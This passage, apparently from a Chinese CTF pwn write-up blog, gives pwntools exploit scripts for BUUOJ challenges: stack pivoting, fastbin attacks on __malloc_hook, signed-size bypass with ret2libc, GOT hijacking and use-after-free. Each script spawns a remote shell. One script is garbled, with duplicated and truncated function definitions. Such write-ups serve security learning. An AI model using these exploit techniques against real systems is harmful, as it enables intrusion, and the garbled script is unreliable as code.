asm(shellcraft.sh())<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="Black-Watch-入群题-PWN">[Black Watch 入群题]PWN</h3><p>栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26380</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./spwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>pd1=<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>pd1+=p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>)<br>r.send(pd1)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(<span class="hljs-number">0x0804A300</span>)+p32(<span class="hljs-number">0x08048408</span>))<br>r.recvuntil(<span class="hljs-string">&#x27;say?&#x27;</span>)<br>true=<span class="hljs-built_in">int</span>(u32(r.recv(<span class="hljs-number">4</span>)))<br>base=true-<span class="hljs-number">0xd43c0</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>binsh=<span class="hljs-number">0x15902b</span><br>system=<span class="hljs-number">0x0003a940</span><br>pd2=<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(base+system)+p32(<span class="hljs-number">0</span>)+p32(binsh+base)<br>r.recvuntil(<span class="hljs-string">&#x27;name?&#x27;</span>)<br>r.send(pd2)<br>r.recvuntil(<span class="hljs-string">&#x27;say?&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(<span class="hljs-number">0x0804A300</span>)+p32(<span class="hljs-number">0x08048408</span>))<br>r.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="大一下">大一下</h2><h3 id="babyheap-0ctf-2017">babyheap_0ctf_2017</h3><p>思路：</p><p>1.运用堆溢出，伪造一个包含index1，2大小的在unsortbin大小范围的块，free到unsortbin，然后申请其原来index1大小的块，main_arena附近的地址就会下移到index2的块，地址就能被dump出来。泄露了main_arena附近的地址</p><p>2.libc基址=main_arena附近的地址-对应偏移-0x10</p><p>malloc_hook=libc基址+libc.sym[‘__malloc_hook’]</p><p>​shell=libc基址+one_gadget</p><p>3.用堆溢出修改free的fastbin块，在fastbin中制造虚假的链指向malloc_hook-0x23处</p><p>再分配两次0x60的块，第二次就分配在malloc_hook-0x23处</p><p>​在这个块上填入shell</p><p>​（任意地址写入任意值）</p><p>最后alloc带动malloc,malloc触发malloc_hook，hook带动shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./babyheap_0ctf_2017&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25542</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------</span><br><br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x91</span>)) <br>free(<span class="hljs-number">1</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>dump(<span class="hljs-number">2</span>) <br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]) <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr) <br>libc_base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span> <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base) <br>hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] <br>shell=libc_base+o_g_old[<span class="hljs-number">1</span>] <br><span class="hljs-comment">#------------------------------------------------------- </span><br>free(<span class="hljs-number">1</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>fill(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(shell)) <br>alloc(<span class="hljs-number">0x20</span>) <br><span class="hljs-comment">#gdb.attach(r) </span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>chunk大小60好像也要固定</p><p>hook-0x23，首先起码要-0x10，其次最近的7f就是再-0x13处了</p><h3 id="pwn2-sctf-2016">pwn2_sctf_2016</h3><p>思路：这里利用了有符号负数，转无符号数，变成极大值，绕过大小检测</p><p>然后return2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27335</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn2_sctf_2016&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;me to read? &#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>s=<span class="hljs-number">0x080486f8</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;printf&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(s)+p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])<br>r.sendlineafter(<span class="hljs-string">&#x27;data!&#x27;</span>,payload)<br>r.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>printf=u32(r.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf)<br>base=printf-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br><span class="hljs-comment">#------------------------------------------------------------</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(binsh)<br>r.sendlineafter(<span class="hljs-string">&#x27;me to read? &#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;data!&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-EasyHeap">[ZJCTF 2019]EasyHeap</h3><p>这题got表可写，pie也没开，没show函数，考虑got劫持。</p><p>首先题目中那个函数目录错了，cat不了flag。</p><p>思路：堆溢出，分配chunk到magic地址附近，因为这题magic在heaparray附近，而heaparray指向chunk，溢出覆盖使其指向free_got，而该chunk则改为system_plt，微调位置，size大小0x7f绕过fastbin的检测。</p><p>改写一个chunk写成binsh。</p><p>free有binsh的那个块，把binsh作为参数带给free（其实是system）</p><p>最后的效果是：</p><p>free（1），实际是system（/bin/sh）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29503</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>     sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br><br>sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------------------</span><br>magic=<span class="hljs-number">0x06020C0</span><br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index0</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index1</span><br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)     <span class="hljs-comment">#index2</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x71</span>)+p64(magic-<span class="hljs-number">0x13</span>))<br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>create(<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)     <span class="hljs-comment">#index3</span><br>edit(<span class="hljs-number">3</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">0</span>,p64(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong>在heaparray里填free_got和chunk0中填system_plt怎么联系起来的，如何劫持got的：</strong></p><p>​                填入free_got这一步的时候，覆盖了chunk0的地址，chunk0的地址那里写入了free_got的地址</p><p>然后再去edit chunk0，就等于edit free_got，然后改成system</p><h3 id="hitcontraining-uaf">hitcontraining_uaf</h3><p>这题堆释放后指针并未清空，再次申请原本print_note_content的变成了shell函数，主要这题print函数还用调用自身来put。</p><p>后面申请8个字节，是把note0的fd改写成了magic函数地址，应为note1的bk指向note0的fd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28547</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content_size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(content_size))<br>        sla(<span class="hljs-string">&#x27;Content :&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span 